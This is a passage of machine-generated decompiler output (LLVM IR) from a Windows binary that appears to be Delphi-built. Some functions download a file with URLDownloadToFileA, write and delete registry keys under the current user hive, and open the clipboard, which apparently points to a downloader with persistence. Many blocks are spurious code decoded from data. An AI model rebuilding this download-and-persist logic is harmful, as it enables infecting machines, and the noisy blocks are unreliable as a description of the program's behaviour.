  %14 = icmp ult i8 %10, 32, !insn.addr !407
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !408

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !409
  %16 = icmp ult i8 %15, 95, !insn.addr !410
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !411
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !411

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !412
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !412
  %21 = shl i32 1, %20, !insn.addr !412
  %22 = and i32 %18, %21, !insn.addr !412
  %23 = icmp ne i32 %22, 0, !insn.addr !412
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !412
  br label %dec_label_pc_404ba9, !insn.addr !412

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !413
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !413

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !414
  %27 = add i32 %esp.0.reload, -4, !insn.addr !415
  %28 = inttoptr i32 %27 to i32*, !insn.addr !415
  store i32 %26, i32* %28, align 4, !insn.addr !415
  %29 = add i32 %esp.0.reload, -8, !insn.addr !416
  %30 = inttoptr i32 %29 to i32*, !insn.addr !416
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !416
  %31 = call i32 @function_404b08(), !insn.addr !417
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !418
  %33 = add i32 %esp.0.reload, -12, !insn.addr !419
  %34 = inttoptr i32 %33 to i32*, !insn.addr !419
  store i32 0, i32* %34, align 4, !insn.addr !419
  %35 = call i32 @function_404b08(), !insn.addr !420
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !421
  %37 = add i32 %esp.0.reload, -16, !insn.addr !422
  %38 = inttoptr i32 %37 to i32*, !insn.addr !422
  store i32 0, i32* %38, align 4, !insn.addr !422
  %39 = call i32 @"@LStrCatN"(), !insn.addr !423
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !424
  br label %dec_label_pc_404c19, !insn.addr !424

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !425
  %41 = call i32 @"@LStrCat"(), !insn.addr !426
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !426
  br label %dec_label_pc_404c19, !insn.addr !426

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !427
  %43 = add i32 %esi.0.reload, -1, !insn.addr !428
  %44 = icmp eq i32 %43, 0, !insn.addr !428
  %45 = icmp eq i1 %44, false, !insn.addr !429
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !429
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !429
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !429
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !429
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !429

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !430
  %47 = load i32, i32* %46, align 4, !insn.addr !430
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !431
  %48 = add i32 %esp.2.reload, 8, !insn.addr !432
  %49 = inttoptr i32 %48 to i32*, !insn.addr !432
  store i32 4213835, i32* %49, align 4, !insn.addr !432
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !433
  %51 = call i32 @"@LStrClr"(), !insn.addr !434
  ret i32 %51, !insn.addr !435
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !436
  ret i32 %0, !insn.addr !436
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !437
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !438
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !439
  %2 = inttoptr i32 %0 to i32*, !insn.addr !439
  store i32 %1, i32* %2, align 4, !insn.addr !439
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !440
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !440
  %7 = add i8 %4, %6, !insn.addr !440
  %8 = inttoptr i32 %5 to i8*, !insn.addr !440
  store i8 %7, i8* %8, align 1, !insn.addr !440
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !441
  %10 = load i32, i32* %eax, align 4, !insn.addr !441
  %11 = udiv i32 %10, 256, !insn.addr !441
  %12 = trunc i32 %11 to i8, !insn.addr !441
  %13 = add i8 %9, %12, !insn.addr !441
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !441
  %14 = call i32 @function_4036b8(), !insn.addr !442
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !443
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !443
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !443
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !444
  %17 = call i32 @"@LStrCatN"(), !insn.addr !445
  %18 = call i32 @function_4036c8(), !insn.addr !446
  %19 = inttoptr i32 %18 to i32*, !insn.addr !447
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !447
  call void @__writefsdword(i32 0, i32 0), !insn.addr !448
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !449
  ret i32 %21, !insn.addr !450
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !451
  ret i32 %0, !insn.addr !451
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !452
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !453
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !454
  %5 = inttoptr i32 %3 to i32*, !insn.addr !454
  store i32 %4, i32* %5, align 4, !insn.addr !454
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !455
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !455
  %10 = add i8 %7, %9, !insn.addr !455
  %11 = inttoptr i32 %8 to i8*, !insn.addr !455
  store i8 %10, i8* %11, align 1, !insn.addr !455
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !456
  %14 = udiv i32 %1, 256, !insn.addr !456
  %15 = trunc i32 %14 to i8, !insn.addr !456
  %16 = add i8 %13, %15, !insn.addr !456
  %17 = load i32, i32* %edi, align 4, !insn.addr !456
  %18 = inttoptr i32 %17 to i8*, !insn.addr !456
  store i8 %16, i8* %18, align 1, !insn.addr !456
  %19 = load i8, i8* %6, align 4, !insn.addr !457
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !457
  %22 = add i8 %19, %21, !insn.addr !457
  %23 = inttoptr i32 %20 to i8*, !insn.addr !457
  store i8 %22, i8* %23, align 1, !insn.addr !457
  %24 = add i32 %0, -117, !insn.addr !458
  %25 = inttoptr i32 %24 to i8*, !insn.addr !458
  %26 = load i8, i8* %25, align 1, !insn.addr !458
  %27 = trunc i32 %2 to i8, !insn.addr !458
  %28 = add i8 %26, %27, !insn.addr !458
  store i8 %28, i8* %25, align 1, !insn.addr !458
  %29 = trunc i32 %2 to i16, !insn.addr !459
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !459
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !460
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !460
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !460
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !461
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !462
  %34 = add i32 %33, 1, !insn.addr !462
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !462
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !463
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !464
  ret i32 0, !insn.addr !465
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !466
  ret i32 %0, !insn.addr !466
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !467
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !469
  %2 = add i32 %1, -1, !insn.addr !469
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !469
  ret i32 %0, !insn.addr !470
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !471
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !472
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !473
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !474
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !475
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !476
  %2 = icmp eq i32 %1, 0, !insn.addr !477
  %3 = icmp eq i1 %2, false, !insn.addr !478
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !478
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !478

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !479
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !480
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !480
  %6 = icmp eq i32 %5, 0, !insn.addr !481
  %7 = icmp eq i1 %6, false, !insn.addr !482
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !482

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !483
  br label %dec_label_pc_404da9, !insn.addr !483

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !484
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !484
  br label %dec_label_pc_404db2, !insn.addr !484

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !485
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !486
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !486
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !486
  %6 = inttoptr i32 %3 to i32*, !insn.addr !486
  store i32 %5, i32* %6, align 4, !insn.addr !486
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !487
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !487
  %11 = add i8 %8, %10, !insn.addr !487
  %12 = inttoptr i32 %9 to i8*, !insn.addr !487
  store i8 %11, i8* %12, align 1, !insn.addr !487
  %13 = add i32 %1, 122, !insn.addr !488
  %14 = inttoptr i32 %13 to i8*, !insn.addr !488
  %15 = load i8, i8* %14, align 1, !insn.addr !488
  %16 = udiv i32 %4, 256, !insn.addr !488
  %17 = trunc i32 %16 to i8, !insn.addr !488
  %18 = add i8 %15, %17, !insn.addr !488
  store i8 %18, i8* %14, align 1, !insn.addr !488
  %19 = load i8, i8* %7, align 4, !insn.addr !489
  %20 = load i32, i32* %eax, align 4, !insn.addr !489
  %21 = trunc i32 %20 to i8, !insn.addr !489
  %22 = add i8 %19, %21, !insn.addr !489
  %23 = icmp eq i8 %22, 0, !insn.addr !489
  %24 = inttoptr i32 %20 to i8*, !insn.addr !489
  store i8 %22, i8* %24, align 1, !insn.addr !489
  %25 = trunc i32 %3 to i16, !insn.addr !490
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !490
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !491

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !491
  br label %dec_label_pc_404dc9, !insn.addr !491

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !489
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !492
  store i32 %29, i32* %eax, align 4, !insn.addr !492
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !493

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !494, !insn.addr !489
  %31 = and i8 %30, 1, !insn.addr !489
  %32 = icmp eq i8 %31, 0, !insn.addr !489
  %33 = trunc i32 %arg4 to i16, !insn.addr !495
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !495
  %35 = inttoptr i32 %2 to i32*, !insn.addr !495
  store i32 %34, i32* %35, align 4, !insn.addr !495
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !496

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !497
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !498
  %36 = add i32 %arg4, 1, !insn.addr !499
  %37 = icmp eq i32 %36, 0, !insn.addr !499
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !500
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !500

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !501
  %39 = add i32 %38, -1, !insn.addr !501
  store i32 %39, i32* %eax, align 4, !insn.addr !501
  %40 = trunc i32 %36 to i16, !insn.addr !502
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !502
  %42 = load i32, i32* %41, align 4, !insn.addr !502
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !502
  %43 = load i32, i32* %41, align 4, !insn.addr !503
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !503
  %44 = add i32 %arg7, 105, !insn.addr !504
  %45 = inttoptr i32 %44 to i8*, !insn.addr !504
  %46 = load i8, i8* %45, align 1, !insn.addr !504
  %47 = trunc i32 %39 to i8, !insn.addr !504
  %48 = add i8 %46, %47, !insn.addr !504
  %49 = icmp ult i8 %48, %46, !insn.addr !504
  store i8 %48, i8* %45, align 1, !insn.addr !504
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !505
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !505

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !504
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !506

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !507
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !508
  %53 = load i32, i32* %52, align 4, !insn.addr !508
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !508
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !509
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !510
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !511
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !512
  %55 = add i32 %arg6, -8, !insn.addr !513
  %56 = inttoptr i32 %55 to i32*, !insn.addr !513
  store i32 0, i32* %56, align 4, !insn.addr !513
  %57 = add i32 %arg6, -12, !insn.addr !514
  %58 = inttoptr i32 %57 to i32*, !insn.addr !514
  store i32 1, i32* %58, align 4, !insn.addr !514
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !515
  ret i32 %57, !insn.addr !515

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !516

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !517
  %62 = add i8 %60, %61, !insn.addr !517
  %63 = inttoptr i32 %2 to i8*, !insn.addr !517
  store i8 %62, i8* %63, align 1, !insn.addr !517
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !518
  %65 = load i8, i8* %64, align 1, !insn.addr !518
  %66 = udiv i32 %arg3, 256, !insn.addr !518
  %67 = trunc i32 %66 to i8, !insn.addr !518
  %68 = add i8 %65, %67, !insn.addr !518
  store i8 %68, i8* %64, align 1, !insn.addr !518
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !518
  br label %dec_label_pc_404e37, !insn.addr !518

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !519
  %70 = inttoptr i32 %69 to i32*, !insn.addr !519
  store i32 0, i32* %70, align 4, !insn.addr !519
  %71 = add i32 %esp.0, -8, !insn.addr !520
  %72 = inttoptr i32 %71 to i32*, !insn.addr !520
  store i32 0, i32* %72, align 4, !insn.addr !520
  %73 = add i32 %esp.0, -12, !insn.addr !521
  %74 = inttoptr i32 %73 to i32*, !insn.addr !521
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !521
  %75 = add i32 %esp.0, -16, !insn.addr !522
  %76 = inttoptr i32 %75 to i32*, !insn.addr !522
  store i32 -2147483647, i32* %76, align 4, !insn.addr !522
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !523
  %78 = call i32 @function_4034c8(), !insn.addr !524
  %79 = add i32 %78, 1, !insn.addr !525
  %80 = add i32 %esp.0, -20, !insn.addr !526
  %81 = inttoptr i32 %80 to i32*, !insn.addr !526
  store i32 %79, i32* %81, align 4, !insn.addr !526
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !527
  br label %dec_label_pc_404e57, !insn.addr !527

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !528
  %83 = add i32 %esp.1.reload, -4, !insn.addr !529
  %84 = inttoptr i32 %83 to i32*, !insn.addr !529
  store i32 %82, i32* %84, align 4, !insn.addr !529
  %85 = add i32 %esp.1.reload, -8, !insn.addr !530
  %86 = inttoptr i32 %85 to i32*, !insn.addr !530
  store i32 1, i32* %86, align 4, !insn.addr !530
  %87 = add i32 %esp.1.reload, -12, !insn.addr !531
  %88 = inttoptr i32 %87 to i32*, !insn.addr !531
  store i32 0, i32* %88, align 4, !insn.addr !531
  %89 = add i32 %esp.1.reload, -16, !insn.addr !532
  %90 = inttoptr i32 %89 to i32*, !insn.addr !532
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !532
  %91 = add i32 %arg6, -8, !insn.addr !533
  %92 = inttoptr i32 %91 to i32*, !insn.addr !533
  %93 = load i32, i32* %92, align 4, !insn.addr !533
  %94 = add i32 %esp.1.reload, -20, !insn.addr !534
  %95 = inttoptr i32 %94 to i32*, !insn.addr !534
  store i32 %93, i32* %95, align 4, !insn.addr !534
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !535
  %97 = load i32, i32* %92, align 4, !insn.addr !536
  %98 = add i32 %esp.1.reload, -24, !insn.addr !537
  %99 = inttoptr i32 %98 to i32*, !insn.addr !537
  store i32 %97, i32* %99, align 4, !insn.addr !537
  %100 = call i32 @function_404374(), !insn.addr !538
  %101 = load i32, i32* %99, align 4, !insn.addr !539
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !540
  store i32 4214421, i32* %90, align 4, !insn.addr !541
  %102 = call i32 @"@LStrClr"(), !insn.addr !542
  ret i32 %102, !insn.addr !543
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !544
  ret i32 %0, !insn.addr !544
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !545
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !546
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !547
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !547
  %5 = inttoptr i32 %2 to i8*, !insn.addr !547
  store i8 %4, i8* %5, align 1, !insn.addr !547
  %6 = add i32 %0, 111, !insn.addr !548
  %7 = inttoptr i32 %6 to i8*, !insn.addr !548
  %8 = load i8, i8* %7, align 1, !insn.addr !548
  %9 = trunc i32 %1 to i8, !insn.addr !548
  %10 = add i8 %8, %9, !insn.addr !548
  %11 = icmp eq i8 %10, 0, !insn.addr !548
  store i8 %10, i8* %7, align 1, !insn.addr !548
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !549

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !549
  br label %dec_label_pc_404ea1, !insn.addr !549

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !548
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !550

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !494, !insn.addr !548
  %16 = and i8 %15, 1, !insn.addr !548
  %17 = icmp eq i8 %16, 0, !insn.addr !548
  %18 = trunc i32 %arg4 to i16, !insn.addr !551
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !551
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !551
  store i32 %19, i32* %20, align 4, !insn.addr !551
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !552

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !553
  %22 = icmp eq i32 %21, 0, !insn.addr !553
  store i32 %arg2, i32* %.reg2mem, !insn.addr !554
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !554

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !555
  %24 = trunc i32 %21 to i16, !insn.addr !556
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !556
  %26 = load i32, i32* %25, align 4, !insn.addr !556
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !556
  %27 = load i32, i32* %25, align 4, !insn.addr !557
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !557
  %28 = add i32 %arg7, 105, !insn.addr !558
  %29 = inttoptr i32 %28 to i8*, !insn.addr !558
  %30 = load i8, i8* %29, align 1, !insn.addr !558
  %31 = trunc i32 %23 to i8, !insn.addr !558
  %32 = add i8 %30, %31, !insn.addr !558
  %33 = icmp eq i8 %32, 0, !insn.addr !558
  store i8 %32, i8* %29, align 1, !insn.addr !558
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !559

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !560
  %34 = inttoptr i32 %23 to i8*, !insn.addr !561
  %35 = load i8, i8* %34, align 1, !insn.addr !561
  %36 = add i8 %35, %31, !insn.addr !561
  store i8 %36, i8* %34, align 1, !insn.addr !561
  %37 = add i32 %arg5, 86, !insn.addr !562
  %38 = inttoptr i32 %37 to i8*, !insn.addr !562
  %39 = load i8, i8* %38, align 1, !insn.addr !562
  %40 = trunc i32 %21 to i8, !insn.addr !562
  %41 = add i8 %39, %40, !insn.addr !562
  store i8 %41, i8* %38, align 1, !insn.addr !562
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !563
  %42 = call i32 @"@LStrClr"(), !insn.addr !564
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !565
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !566
  %44 = zext i1 %43 to i32, !insn.addr !567
  ret i32 %44, !insn.addr !567

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !568
  %46 = inttoptr i32 %45 to i8*, !insn.addr !568
